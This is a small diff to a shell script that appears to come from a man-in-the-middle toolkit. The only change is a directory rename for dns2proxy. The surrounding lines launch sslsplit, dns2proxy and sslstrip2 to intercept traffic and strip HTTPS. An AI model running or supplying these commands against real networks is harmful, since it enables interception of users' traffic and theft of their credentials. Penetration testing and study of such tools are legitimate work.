@@ -59,8 +59,8 @@ sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir -k ca.key -c ca.c
 
 sstrip(){
 setup
-cd ${DIR}/dns2proxy_hsts-master/
-python "${DIR}/dns2proxy_hsts-master/dns2proxy.py" &
+cd ${DIR}/dns2proxy-master/
+python "${DIR}/dns2proxy-master/dns2proxy.py" &
 cd ${DIR}
 python "${DIR}/sslstrip2-master/sslstrip.py" -a -l 8080 &
 python "${DIR}/sslstrip2-master/sslstrip.py" -a -l 8443 
